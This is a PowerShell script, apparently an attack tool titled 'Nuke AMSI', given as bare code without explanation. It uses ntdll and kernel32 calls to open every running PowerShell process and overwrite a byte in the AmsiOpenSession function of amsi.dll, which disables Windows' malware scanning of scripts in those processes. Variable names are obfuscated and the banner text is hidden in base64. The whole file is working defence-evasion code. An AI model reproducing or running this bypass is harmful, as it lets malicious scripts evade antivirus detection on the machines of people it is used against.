$B=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VwByAGkAdABlAC0ASABvAHMAdAAgACIAUwB0AGEAcgB0AGkAbgBnACAATgB1AGsAZQAgAEEATQBTAEkAIABzAGMAcgBpAHAAdAAuAC4ALgAiACAA
LQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEMAeQBhAG4A'));iex $B;$C=Read-Host "Are you ready?";Add-Type -Ty @"
using System;using System.Diagnostics;using System.Runtime.InteropServices;
public class T{public const int A=0x8,B=0x10,C=0x20;public const uint D=0x40;
[DllImport("ntdll.dll")]public static extern int NtOpenProcess(out IntPtr E,uint F,[In]ref G H,[In]ref I J);
[DllImport("ntdll.dll")]public static extern int NtWriteVirtualMemory(IntPtr K,IntPtr L,byte[] M,uint N,out uint O);
[DllImport("ntdll.dll")]public static extern int NtClose(IntPtr P);
[DllImport("kernel32.dll",SetLastError=true)]public static extern IntPtr LoadLibrary(string Q);
[DllImport("kernel32.dll",SetLastError=true)]public static extern IntPtr GetProcAddress(IntPtr R,string S);
[DllImport("kernel32.dll",SetLastError=true)]public static extern bool VirtualProtectEx(IntPtr T,IntPtr U,UIntPtr V,uint W,out uint X);
[StructLayout(LayoutKind.Sequential)]public struct G{public int Y;public IntPtr Z,A,B;public IntPtr C,D;}
[StructLayout(LayoutKind.Sequential)]public struct I{public IntPtr E,F;}}"@

function p{param([int]$x)
$y=[byte]0xEB;$z=New-Object T+G;$a=New-Object T+I;$a.E=[IntPtr]$x;$a.F=[IntPtr]::Zero;$z.Y=[Runtime.InteropServices.Marshal]::SizeOf($z)
$b=[IntPtr]::Zero;$c=[T]::NtOpenProcess([ref]$b,[T]::A -bor [T]::B -bor [T]::C,[ref]$z,[ref]$a);if($c -ne 0){return}
$d=[T]::LoadLibrary("amsi.dll");if($d -eq [IntPtr]::Zero){[T]::NtClose($b);return}
$e=[T]::GetProcAddress($d,"AmsiOpenSession");if($e -eq [IntPtr]::Zero){[T]::NtClose($b);return}
$f=[IntPtr]($e.ToInt64()+3);$g=[UInt32]0;$h=[UIntPtr]::new(1)
$i=[T]::VirtualProtectEx($b,$f,$h,[T]::D,[ref]$g);if(-not $i){[T]::NtClose($b);return}
$j=[UInt32]0;$k=[T]::NtWriteVirtualMemory($b,$f,[byte[]]@($y),1,[ref]$j)
$l=[T]::VirtualProtectEx($b,$f,$h,$g,[ref]$g);[T]::NtClose($b)}

function q{Get-Process|?{$_.ProcessName -eq "powershell"}|%{p -x $_.Id}}
q
